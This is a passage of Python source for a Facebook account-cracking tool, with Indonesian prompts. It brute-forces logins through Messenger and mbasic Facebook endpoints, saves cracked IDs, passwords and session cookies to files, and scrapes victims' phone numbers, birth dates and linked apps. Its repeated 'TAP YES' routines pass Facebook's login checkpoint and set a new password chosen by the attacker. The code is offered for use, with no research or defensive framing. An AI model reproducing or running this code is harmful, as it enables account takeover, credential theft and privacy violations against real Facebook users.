				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

###-----[ METODE MESSENGER ]-----###
def _messenger_(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile messenger [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	while True:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":idf,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pwv:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r  \033[0m                ➛ \033[32m%s"%(game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r  \033[0m                ➛ %s"%(game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
		
#-------[TAP YES V1]--------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Ini mungkin kebnyakn {H2}akun tidak, cekpoin {M2}dan tidak semua berganti sandi Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(tanggal),width=70,padding=(0,7),style=f"{color_panel}")) 
		opsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s.%s \033[0mlogin akun %s> %s%s"%(str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.latest.facebook.com"
	session.headers.update({"Host": "https://mbasic.latest.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://https://mbasic.latest.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.prod.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{ua}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
		
#------[TAP YES V2]------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\033[32m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def filecek_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Jangan terlalu sering pakai kasih delay minimal 10/5 menit lah Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(tanggal),width=70,padding=(0,7),style=f"{color_panel}")) 
		cekopsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def cekopsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		cekopsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s.%s \033[0mlogin akun %s> %s%s"%(str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = random.choice(ugen7)
	#ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
	url = "https://mbasic.beta.facebook.com"
	session.headers.update({"Host": "mbasic.beta.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.beta.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.beta.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		prints(nel(f'{P2}Terdapat {H2}{str(len(cek))} {P2}opsi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						tree = Tree(" ")
						tree.add(f"\r[green]{user}|{pwbaru[0]}[white] ").add(f"\r[green]{ua}[white] ")
						tree.add(f"\r[green]{coki}[white] ")
						Buat(tree)
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
		
#------[TAP YES V3]------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def filecek4_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Jangan terlalu sering pakai kasih delay minimal 10/5 menit lah Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(tanggal),width=70,padding=(0,7),style=f"{color_panel}")) 
		cekopsi()
	except IOError:
